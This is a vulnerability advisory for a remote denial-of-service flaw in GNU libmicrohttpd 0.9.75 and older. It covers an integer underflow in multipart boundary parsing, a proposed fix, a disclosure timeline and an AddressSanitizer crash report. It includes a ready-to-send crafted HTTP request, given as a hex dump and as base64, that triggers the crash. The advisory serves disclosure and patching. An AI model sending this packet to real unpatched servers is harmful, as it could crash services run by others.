<h2><b><i>Summary</i></b></h2>

GNU libmicrohttpd version prior 0.9.75 version (included) is vulnerable to a remote DoS (Denial of Service) due to improper parsing of the multipart/form-data's `boundary` in MHD_create_post_processor() method.

Affected: libmicrohttpd 0.9.75 and older

<blockquote>
"GNU libmicrohttpd is a GNU package offering a C library that provides
a compact API and implementation of an HTTP 1.1 web server (HTTP 1.0
is also supported).  GNU libmicrohttpd only implements the HTTP 1.1
protocol.  The main application must still provide the application
logic to generate the content."
</blockquote>

(source: project's README.md)

-  [GNU libmicrohttpd's website](https://www.gnu.org/software/libmicrohttpd/)

- [0.9.76 release e-mail](https://lists.gnu.org/archive/html/libmicrohttpd/2023-02/msg00000.html)

- [The fix](https://git.gnunet.org/libmicrohttpd.git/commit/?id=6d6846e20bfdf4b3eb1b592c97520a532f724238)

CVE ID: Pending

CVSS (3.1): 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:U/RL:X/RC:X)

Discovered by:</br>
&ensp;hebi</br>
&ensp;Gynvael Coldwind</br>

Method of discovery:</br>
&ensp;Fuzzing

<h2><b><i>Vulnerability details</i></b></h2>

While fuzzing libmicrohttpd we've stumbled on a minor issue with boundary processing which – with some serious heap massaging – could lead to being able to crash MHD remotely.

The problem exists in `MHD_create_post_processor()` function here:

```
    blen = strlen (boundary);    // <-------- 1
    if ( (blen == 0) ||
         (blen * 2 + 2 > buffer_size) )
      return NULL;
    if ( (boundary[0] == '"') &&        // <-------- 2
         (boundary[blen - 1] == '"') )
    {
      /* remove enclosing quotes */
      ++boundary;
      blen -= 2;   // <-------- 3
    }
```

Assume the following boundary:
```
Content-Type:multipart/form-data; boundary="\0\0\0\0\0..."
```

Walking through the code we get:
  * Point 1: `blen = 1;` since for strlen boundary will be just `"` followed by null-bytes.
  * Point 2: both `boundary[0]` and `boundary[1 - 1]` are obviously `"`
  * Point 3: `blen -= 2` results in an unsigned integer underflow, i.e. 0xffffffffffffffff

Later in the `find_boundary()` function there's a `memcmp()` used to compare the potential boundary in the POST body with the previously found boundary:

```
  if ( (0 != memcmp ("--",
                     buf,
                     2)) ||
       (0 != memcmp (&buf[2],    // <--------- 4
                     boundary,
                     blen)))
  {
```

At Point 4 `blen` is equal to 0xffffffffffffffff, so if the `--` were at the end of the buffer (which is likely by zeroes which were in memory), we get a read buffer overrun.

As far as severity goes, we though about potential side-channel leaks here, but we came up with nothing. Furthermore, even trying to exploit this as a DoS with the standard GNU C library's malloc failed in our attempts (though we still can't rule out that it's possible).
However since MHD is used on embedded devices with their own malloc implementations, we decided to report this as a potential security issue directly to you.

At the end of the report we included a test HTTP packet (as hex dump and base64) and an AddressSanitizer report.

<h2><b><i>Proposed fix</i></b></h2>

A potential fix could be to check if `blen` is less than 2 inside that if at Point 2 above, and if so, just return `NULL`.

```
if (blen < 2){
  return NULL;
}
```

<h2><b><i>Timeline</i></b></h2>
<ul>
  <li>2023-02-13: Vulnerability discovered.</li>
  <li>2023-02-26: Vulnerability reported.</li>
  <li>2023-02-27: Vulnerability fixed, new release published</li>
  <li>2023-02-27: Details published (immediately due to triviality / low severity / being hard to exploit).</li>
  <li>2023-02-27: CVE requested.</li>
</ul>
<h2><b><i>Test packet:</i></b></h2>

```
00000000  50 4f 53 54 20 2f 20 48  54 54 50 2f 31 2e 31 0d  |POST / HTTP/1.1.|
00000010  0a 48 6f 73 74 3a 30 2e  30 2e 30 2e 30 0d 0a 43  |.Host:0.0.0.0..C|
00000020  6f 6e 74 65 6e 74 2d 54  79 70 65 3a 6d 75 6c 74  |ontent-Type:mult|
00000030  69 70 61 72 74 2f 66 6f  72 6d 2d 64 61 74 61 3b  |ipart/form-data;|
00000040  20 62 6f 75 6e 64 61 72  79 3d 22 00 41 22 0d 0a  | boundary=".A"..|
00000050  43 6f 6e 74 65 6e 74 2d  4c 65 6e 67 74 68 3a 34  |Content-Length:4|
00000060  0d 0a 0d 0a 2d 2d 00 41                           |....--.A|
00000068
```
Base64 encoded for convenience:
```
UE9TVCAvIEhUVFAvMS4xDQpIb3N0OjAuMC4wLjANCkNvbnRlbnQtVHlwZTptdWx0aXBhcnQvZm9y
bS1kYXRhOyBib3VuZGFyeT0iAEEiDQpDb250ZW50LUxlbmd0aDo0DQoNCi0tAEE=
```

<h2><b><i>AddressSanitizer report</i></b></h2>
Note: ASAN report is for a 32-bit version of libmicrohttpd, though it doesn't really matter.

```
==50113==ERROR: AddressSanitizer: negative-size-param: (size=-1)
    #0 0x56633acb in MemcmpInterceptorCommon(void*, int (*)(void const*, void const*, unsigned int), void const*, void const*, unsigned int) (/libmicrohttpd-0.9.75/simplepost+0x33acb)
    #1 0x56634170 in bcmp (/libmicrohttpd-0.9.75/simplepost+0x34170) 
    #2 0xf7ef1195 in find_boundary /libmicrohttpd-0.9.75/src/microhttpd/postprocessor.c:934:14
    #3 0xf7eecea7 in post_process_multipart /libmicrohttpd-0.9.75/src/microhttpd/postprocessor.c:1413:14
    #4 0xf7eecea7 in MHD_post_process /libmicrohttpd-0.9.75/src/microhttpd/postprocessor.c:1632:12
    #5 0x566d929d in answer_to_connection /libmicrohttpd-0.9.75/../mhd_harness/simplepost.c:186:7
    #6 0xf7eb453a in process_request_body /libmicrohttpd-0.9.75/src/microhttpd/connection.c:3320:9
    #7 0xf7eb453a in MHD_connection_handle_idle /libmicrohttpd-0.9.75/src/microhttpd/connection.c:4596:9
    #8 0xf7ed9ff7 in call_handlers /libmicrohttpd-0.9.75/src/microhttpd/daemon.c:1221:11
    #9 0xf7ecce06 in MHD_epoll /libmicrohttpd-0.9.75/src/microhttpd/daemon.c:5145:5
    #10 0xf7ecfec3 in MHD_run_wait /libmicrohttpd-0.9.75/src/microhttpd/daemon.c:5277:11
    #11 0x566d902e in main /libmicrohttpd-0.9.75/../mhd_harness/simplepost.c:215:42
    #12 0xf7b4f518 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #13 0xf7b4f5f2 in __libc_start_main csu/../csu/libc-start.c:392:3
    #14 0x5661a4ca in _start (/libmicrohttpd-0.9.75/simplepost+0x1a4ca) 

0xf57039de is located 94 bytes inside of 609-byte region [0xf5703980,0xf5703be1)
allocated by thread T0 here:
    #0 0x5669be1c in __interceptor_calloc (/libmicrohttpd-0.9.75/simplepost+0x9be1c) 
    #1 0xf7eec197 in MHD_create_post_processor /libmicrohttpd-0.9.75/src/microhttpd/postprocessor.c:326:22
    #2 0x566d930b in answer_to_connection /libmicrohttpd-0.9.75/../mhd_harness/simplepost.c:156:9

SUMMARY: AddressSanitizer: negative-size-param (/libmicrohttpd-0.9.75/simplepost+0x33acb)  in MemcmpInterceptorCommon(void*, int (*)(void const*, void const*, unsigned int), void const*, void const*, unsigned int)
==50113==ABORTING
```
